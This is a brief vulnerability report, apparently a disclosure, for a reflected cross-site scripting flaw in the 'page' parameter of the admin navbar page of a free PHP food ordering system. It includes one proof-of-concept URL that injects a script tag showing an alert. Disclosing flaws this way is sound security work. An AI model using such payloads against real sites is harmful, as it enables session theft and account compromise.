vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212480936-7ba36ea3-5b40-4762-9f70-c7a328377d92.png)
http://192.168.249.88/php-fos-db/admin/navbar.php?page=%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
![image](https://user-images.githubusercontent.com/30823782/212480946-b9e3a5fc-7037-4dec-b4bf-de0684604f41.png)

